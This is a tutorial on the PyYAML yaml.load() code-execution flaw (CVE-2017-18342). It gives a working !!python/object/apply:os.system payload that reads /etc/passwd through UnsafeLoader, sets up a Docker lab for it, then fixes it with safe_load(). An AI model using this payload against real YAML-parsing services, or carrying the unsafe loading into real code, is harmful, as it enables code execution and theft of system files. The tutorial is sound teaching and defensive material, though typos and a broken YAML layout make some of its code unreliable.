**CVE-2017-18342**. 

**Objective of the material** 

This tutorial will help you to understand CVE vulnerabilities in detailed way, how to simulate the vulnerability and do advanced exploitation in safe environments. Then how to fix this vulnerability. 

**Description**  

In PyYAML before 5.1, the yaml.load() API could execute arbitrary code if used with untrusted data. The load() function has been deprecated in version 5.1 and the 'UnsafeLoader' has been introduced for backward compatibility with the function.

**What is PyYAML**  

PyYAML is a YAML parser and emitter for the Python programming language 

**Vulnerablity**  

Issue with yaml.load()

>Vulnerability: The yaml.load() function is used to parse YAML data.When yaml.load() parses a YAML file, it not only deserializes basic data types (like strings, lists, or dictionaries) but can also instantiate Python objects.

>Arbitrary Code Execution: If untrusted YAML data is passed to yaml.load(), it could cause Python objects or even functions to be instantiated or executed. This behavior leads to arbitrary code execution (RCE), where an attacker could craft a malicious YAML file that runs dangerous commands or code on the server or client, potentially taking full control of the system. 

**Prerequisites** 

Tools/Technologies Needed
Python  
PyYAML  
Docker (for containerization and easy setup) 

Basic Knowledge: 
Understanding YAML format. 
Knowledge of serialization and deserialization concepts. 
 

**Step 1: Create a Vulnerable Python Application**

Create a folder name CVE-2017-18342 and add a file named exploit.py containing the following code: 
 
    import yaml
 
    # Malicious YAML payload
    payload = """ 
    !!python/object/apply:os.system
    args: ["cat /etc/passwd > putput.txt && echo 'File read and written successfully' >> output.txt"] 
    """ 
 
    # Attempt to load the malicious payload 
    yaml.load(payload, Loader=yaml.UnsafeLoader) 
    print("Exploit executed. Check output.txt for the result.") `
 
 
This code reads the contents of a sensitive file (/etc/passwd) and stores it in a file (output.txt). 
The yaml.load() function would execute the os.system call, which is very dangerous. 
If you notice, we use the UnsafeLoad function because for backward compatibility. The UnsafeLoader was introduced after version 5.1, allowing users to explicitly opt into the dangerous behavior of yaml.load().

**Step 2: Create Docker Environment** 

Create a docker-compose.yml file under CVE-2017-18342 to set up the environment with a vulnerable version of PyYAML:
 
    version: '3' 
    services: 
    pyyaml-vulnerable: 
    image: python:3.8-slim 
    container_name: pyyaml-vulnerable-container 
    volumes: 
    - .:/app 
    working_dir: /app 
    command: sh -c "pip install PyYAML==5.1 && python3 exploit.py" 

**Step 3: Run the Vulnerable Application** 

Start the application by using Docker 
Start the docker application - this can be done from the docker desktop by turning it on or restarting. 
Go to CVE-2017-18342 folder in the terminal where all the above files are and run the following code. 
 
 
    docker-compose up â€“build 
 
**Step 4: Observe the Exploit**

After successfully running this vulnerability, you get a new output.txt file that contains user account information. 

you should see the output from the malicious YAML being executed, confirming the exploit: 

You successfully run vulnerabilities! 

**Step 5: Fixing the Vulnerability**

Create a file called safety.py which update the Code to use yaml.safe_load() 

    import yaml 
 
    # Malicious YAML payload 
    payload = """ 
    !!python/object/apply:os.system 
    args: ["cat /etc/passwd > putput.txt && echo 'File read and written successfully' >> output.txt"] 
    """ 
 
    # Attempt to load the malicious payload 
    yaml.safe_load(payload) 
    print("Exploit executed. Check output.txt for the result.") 
 
By replaceing yaml.load() with yaml.safe_load(), which prevents arbitrary code execution by only allowing simple Python objects (like lists and dictionaries) to be loaded.  
 
**Step 6: Update Docker Environment to Test the Fix**

Update docker-compose.yml to test the fixed script. 
 
    version: '3' 
    services: 
    pyyaml-fixed: 
    image: python:3.8-slim 
    container_name: pyyaml-fixed-container 
    volumes: 
    - .:/app 
    working_dir: /app 
    command: sh -c "pip install PyYAML==5.1 && python3 safety.py" 
 
**Step 7: Run the Fixed Application** 

Rebuild and restart the container with the fixed code 
 
Use docker-compose up --build in the terminal to build and run the environment with the corrected 
 
**Step 8: Verify the Fix** 

After running the application, the malicious YAML will no longer be executed:

Explanation: 

The error you're seeing confirms that safe_load() blocks the loading of the custom YAML tag !!python/object/apply:os.system. This is expected behavior when using safe_load() and shows that it is working as a security measure. 

By using yaml.safe_load(), the deserialization process is limited to basic types, and no arbitrary code execution is possible. The malicious YAML is treated as harmless data. 
 

**Step 9. Best Practices for Deserialization** 

Always use yaml.safe_load() when processing untrusted YAML input. 
Be cautious when deserializing data from unknown sources. Arbitrary code execution is a common deserialization vulnerability in many formats, including YAML, JSON, and XML. 
Upgrade dependencies like PyYAML regularly to ensure you are protected from known vulnerabilities. 
 

**Conclusion** 

Reiterate the importance of using safe_load() instead of load() when working with YAML data to avoid arbitrary code execution vulnerabilities. 
Emphasize that upgrading PyYAML to the latest secure version (5.4.1 or later) also helps prevent this vulnerability. 
Provide a reminder to test all dependencies for security vulnerabilities using tools like pip-audit or similar. 
 
**Additional Resources** 

PyYAML Documentation- https://pyyaml.org/wiki/PyYAMLDocumentation
CVE-2017-18342 Details- https://nvd.nist.gov/vuln/detail/CVE-2017-18342
Best Practices for Deserialization in Python- https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html , https://docs.python.org/3/library/pickle.html#restricting-globals 

https://forms.gle/ZbP9RuXFSX2qjGfHA
 
